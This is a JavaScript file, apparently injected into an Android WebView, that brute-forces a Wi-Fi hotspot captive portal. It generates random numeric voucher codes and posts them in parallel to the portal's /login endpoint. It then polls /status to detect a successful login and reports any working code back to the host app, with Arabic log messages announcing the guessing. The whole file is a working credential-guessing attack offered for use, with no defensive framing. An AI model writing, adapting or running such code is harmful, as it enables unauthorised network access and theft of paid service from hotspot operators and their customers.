(function() {
    try { if (window.stopFinder) window.stopFinder(); } catch(e) {}
    const CFG = window.FINDER_CONFIG;
    if (!CFG) { return; }
    let stopped = false;
    window.stopFinder = function() { stopped = true; };

    
function updatePageInput(v) {
    try {
        var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[name="username"]');
        for (var i = 0; i < inputs.length; i++) {
            var inp = inputs[i];
            if (inp.id !== 'urlBar' && inp.name !== 'urlBar') {
                inp.value = v;
                inp.dispatchEvent(new Event('input', {bubbles:true}));
                inp.dispatchEvent(new Event('change', {bubbles:true}));
                break;
            }
        }
    } catch(e) {}
}

    function log(m) { try { window.AndroidBridge.log(m); } catch(e) {} }
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function safeJson(url) {
        try {
            const r = await fetch(url, { credentials: 'include', cache: 'no-cache' });
            const t = await r.text();
            try { return JSON.parse(t); } catch(e) {
                const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                return null;
            }
        } catch(e) { log("⚠ fetch status فشل: " + e.message); return null; }
    }
    function isActive(st) {
        if (!st) return false;
        const li = String(st.logged_in || '').toLowerCase();
        if (!['yes','true','1','on'].includes(li)) return false;
        const u = String(st.username || '').trim();
        const ip = String(st.ip || '').trim();
        const up = String(st.uptime || '').trim();
        return (u && u !== '-' && u !== 'N/A') || (ip && ip !== '-' && up && up !== '-');
    }
    function statusUser(st) {
        if (!st) return null;
        const u = String(st.username || '').trim();
        return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
    }
    function uptimeSec(s) {
        if (!s) return -1;
        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
        if (!m) return -1;
        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
    }
    function calcParallel(r) {
        if (r < 50) return 10;
        if (r < 100) return 8;
        if (r < 180) return 6;
        if (r < 300) return 4;
        if (r < 500) return 3;
        if (r < 900) return 2;
        return 1;
    }

    async function run() {
        try {
            const base = new URL(CFG.url).origin;
            const statusUrl = base + '/status?var=callBack';
            const loginUrl = base + '/login';

            log('▶ بدء التخمين');
            
            const init = await safeJson(statusUrl);
            if (init && isActive(init)) {
                const u = statusUser(init);
                if (u) {
                    log('✓ كرت مسجل موجود: ' + u);
                    window.AndroidBridge.found(u, JSON.stringify(init));
                    return;
                }
                log('⚠ جلسة نشطة، username مخفي');
                return;
            }

            let parallel = CFG.rttEvery > 0 ? CFG.rttEvery : 5;
            log('  السرعة (التوازي) = ' + parallel);

            let template = { username: '', password: '', dst: base + '/', popup: 'true' };
            try {
                const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
                const doc = new DOMParser().parseFromString(html, 'text/html');
                const form = doc.querySelector('form');
                if (form) {
                    form.querySelectorAll('input').forEach(i => {
                        const n = i.getAttribute('name');
                        if (n) template[n] = i.getAttribute('value') || '';
                    });
                }
            } catch(e) { }

            log('▶ بدء المحاولات (' + CFG.attempts + ')');

            const maxVal = Math.pow(10, CFG.digits) - 1;
            const tried = new Set();
            const beforeUp = init ? uptimeSec(init.uptime) : -1;
            const beforeActive = isActive(init);
            let done = 0, batchCount = 0;

            function gen() {
                for (let k = 0; k < 500; k++) {
                    const num = Math.floor(Math.random() * (maxVal + 1));
                    const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
                    if (!tried.has(v)) { tried.add(v); return v; }
                }
                return null;
            }

            async function post(v) {
                const body = new URLSearchParams();
                for (const k in template) body.set(k, template[k]);
                body.set('username', v);
                body.set('password', '');
                try {
                    const r = await fetch(loginUrl, {
                        method: 'POST', body: body.toString(),
                        credentials: 'include',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        redirect: 'manual'
                    });
                    return { v, code: r.status };
                } catch(e) {
                    return { v, code: 0 };
                }
            }

            while (done < CFG.attempts && !stopped) {
                const batch = [];
                for (let j = 0; j < parallel && done < CFG.attempts; j++) {
                    const v = gen();
                    if (!v) break;
                    done++;
                    
                    // إظهار كل رقم يتم تجربته في السجل
                    log('🔍 ' + v);
                    
                    try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
                    updatePageInput(v);
                    log("🔍 " + v);
                    batch.push(post(v));
                }
                if (batch.length === 0) break;

                const results = await Promise.all(batch);
                batchCount++;

                const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503);
                if (needCheck) {
                    await sleep(20);
                    const st = await safeJson(statusUrl);
                    const u = statusUser(st);
                    if (u) {
                        log('✅✅✅ كشف عبر status: ' + u);
                        window.AndroidBridge.found(u, JSON.stringify(st));
                        return;
                    }
                    const up = uptimeSec(st && st.uptime);
                    if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
                        const cand = results.find(r => r.code > 0);
                        if (cand) { 
                            log('✅✅✅ جلسة جديدة: ' + cand.v); 
                            window.AndroidBridge.found(cand.v, JSON.stringify(st)); 
                            return; 
                        }
                    }
                }

                if (CFG.pause > 0) await sleep(CFG.pause);
            }
            log('❌ انتهى');
        } catch(e) {
            log('❌ خطأ: ' + e.message);
        }
    }

    setTimeout(run, 300);
})();
